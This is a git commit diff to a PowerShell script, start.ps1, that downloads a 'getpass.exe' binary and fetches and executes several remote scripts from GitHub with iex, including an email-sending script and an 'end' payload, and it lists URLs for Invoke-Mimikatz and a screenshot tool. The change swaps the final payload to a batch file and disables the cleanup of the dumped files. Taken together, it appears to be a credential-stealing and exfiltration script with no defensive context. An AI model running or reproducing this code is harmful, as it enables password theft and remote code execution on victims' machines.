ff4b80bb07af9e807d261a972ae6a4aced83a189
pc gou <pc gou>
2016-06-05 19:16:51 +0800

    alter

--- start.ps1
+++ start.ps1
@@ -3,8 +3,8 @@ $command = "https://raw.githubusercontent.com/gpengc/powershell/master/command.b
 $mimikatz = "https://raw.githubusercontent.com/gpengc/powershell2/master/Invoke-Mimikatz.ps1"
 $screenshot = "https://raw.githubusercontent.com/gpengc/powershell2/master/Take-ScreenShot.ps1"
 $sendmail = "https://raw.githubusercontent.com/gpengc/powershell2/master/send-mail.ps1"
-$end="https://github.com/gpengc/powershell2/raw/master/end.ps1"
-
+#$end="https://github.com/gpengc/powershell2/raw/master/end.ps1"
+$end="https://github.com/gpengc/powershell2/raw/master/end.bat"
 (new-object net.webclient).downloadfile($getpass,"e:\getpass.exe")
 iex((new-object net.webclient).downloadstring($command))
 #(new-object net.webclient).downloadstring($mimikatz) > e:\mimikatz.ps1
@@ -13,6 +13,6 @@ iex((new-object net.webclient).downloadstring($sendmail))
 sleep -s 5
 iex((new-object net.webclient).downloadstring($end))
 #sleep -s 5
-rm e:\getpass.*
-rm e:\screen.png
+#rm e:\getpass.*
+#rm e:\screen.png
 
